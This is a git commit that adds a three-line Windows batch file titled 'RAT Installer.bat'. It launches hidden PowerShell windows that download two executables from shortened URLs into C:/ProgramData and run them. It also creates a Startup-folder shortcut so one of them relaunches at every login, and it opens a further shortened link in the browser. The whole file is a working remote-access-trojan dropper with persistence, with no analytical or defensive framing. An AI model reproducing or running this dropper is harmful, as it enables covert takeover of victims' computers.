c33706a51e05e7755c1657157340270eca3deec3
InsertSickName <94913361+InsertSickName@users.noreply.github.com>
2022-01-13 16:37:54 +0530

    Create RAT Installer.bat

---
+++ RAT Installer.bat
@@ -0,0 +1,3 @@
+start powershell -windowstyle hidden -Command "curl.exe -L --output 'C:/ProgramData/sub.exe' --url 'https://cutt.ly/kUwzC1V'; start 'C:/ProgramData/sub.exe'"
+start powershell -windowstyle hidden -Command "curl.exe -L --output 'C:/programdata/Windows.exe' --url 'https://cutt.ly/nUwzKbO'; start 'C:/ProgramData/Windows.exe'; $s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%/Start Menu/Programs/Startup/Shortcut.lnk');$s.TargetPath='C:/ProgramData/Windows.exe';$s.Save()"
+start https://cutt.ly/kIr8iwJ
